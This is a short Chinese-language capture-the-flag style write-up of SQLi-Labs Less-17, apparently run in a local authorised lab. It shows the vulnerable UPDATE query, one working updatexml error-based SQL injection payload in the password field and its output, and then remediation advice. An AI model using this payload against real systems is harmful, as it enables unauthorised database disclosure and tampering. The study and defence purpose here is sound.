Less-17：UPDATE 密码字段报错注入

记录本题的输入位置、SQL 拼接上下文、实际验证结果和修复思路。

# UPDATE / 报错注入# 本地授权靶场# MySQL

题目信息

关卡Less-17
类型UPDATE / 报错注入
输入点POST 字段 passwd；uname 仅做有限校验
环境本地授权 SQLi-Labs，MySQL 5.5.44
Flag普通关卡无 flag；挑战关以提交随机 key 后的成功页面为准

原 SQL 上下文

UPDATE users SET password = '$passwd' WHERE username='$row1'

本题的关键是先确认输入落在字符串、数字、括号、请求头还是其他 SQL 子句中，再决定闭合与读取方式。

漏洞分析

真正可注入的位置是改密的新密码字段。先用合法用户名通过查询，再让 UPDATE 中的密码值触发报错。

利用与验证

uname=Dumb&passwd=' or updatexml(1,concat(0x7e,database()),1)-- -&submit=Submit
页面显示 XPATH syntax error: '~security'。

修复建议

  • 使用 PDO 或 mysqli 预处理语句绑定参数，禁止把输入直接拼接进 SQL。
  • 对数字型参数做整数转换和范围校验；字符串参数明确类型与最大长度。
  • 关闭生产环境的 SQL 详细报错，避免库名、表名和语法结构泄露。
  • 数据库账号遵循最小权限，禁用不必要的多语句、FILE 和跨库能力。

复盘

先识别闭合上下文，再选择报错、联合查询、布尔盲注、时间盲注或堆叠副作用作为验证通道。payload 只是结果，真正可复用的是判断流程。
